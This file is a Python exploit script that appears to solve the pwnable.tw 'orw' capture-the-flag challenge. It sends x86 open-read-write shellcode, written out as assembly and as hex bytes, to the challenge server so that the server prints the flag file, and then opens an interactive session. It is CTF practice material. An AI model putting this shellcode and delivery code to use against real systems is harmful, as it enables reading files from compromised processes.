import socket, struct, telnetlib, time

def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

# main
s, f = sock("chall.pwnable.tw", 10001)

'''
// "open-read-write.s"
// gcc -m32 -nostdlib open-read-write.s ; objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'

.intel_syntax noprefix
.globl _start

_start:
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
open:
	# open("///home/orw/flag",0,0)
	mov al, 5
        push ecx
        push 0x67616c66 # "flag"
        push 0x2f77726f # "orw/"
        push 0x2f656d6f # "ome/"
        push 0x682f2f2f # "///h"
	mov ebx, esp
	int 0x80

read:
	# read(fd,buf,255)
        mov ebx, eax # save fd
	mov al, 3
        mov ecx, esp
        mov dl, 255
	int 0x80

write:
	# write(1,buf,255)
        mov al, 4
        mov bl, 1
	int 0x80

exit:
	# exit
	xor eax, eax
	inc eax
	int 0x80
'''
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x51\x68\x66\x6c\x61\x67\x68\x6f\x72\x77\x2f\x68\x6f\x6d\x65\x2f\x68\x2f\x2f\x2f\x68\x89\xe3\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\xff\xcd\x80\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x40\xcd\x80"

f.write(shellcode)
shell(s)
